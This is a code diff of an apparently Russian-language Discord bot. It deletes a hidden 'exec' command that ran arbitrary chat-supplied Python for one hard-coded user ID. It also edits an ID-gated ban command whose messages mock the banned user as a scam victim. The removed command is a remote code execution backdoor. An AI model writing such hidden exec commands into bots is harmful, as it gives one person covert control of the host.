@@ -170,10 +170,7 @@ async def warn(ctx, arg, txt):
 @bot.command(hidden=True)
 async def setupsrv(ctx):
     getServerSettings(ctx.guild.id)
-@bot.command(hidden=True)
-async def exec(ctx, *, code):
-    if ctx.author.id == 790118961671831552:
-        exec(code)
+
 @bot.command()
 async def date(ctx):
     author = ctx.message.author
@@ -204,7 +201,7 @@ async def about_fox(ctx):
     await ctx.reply(json_data['fact']) # Отправляем Embed
 
 @bot.command()
-async def ban(ctx, member: discord.Member, *, reason=None):
+async def ban(ctx, member: discord.Member, reason="вас заскамили"):
   if ctx.author.id == 790118961671831552:
     await member.ban(reason=reason)
     await ctx.reply("пхпхпх замамили скаммонта")
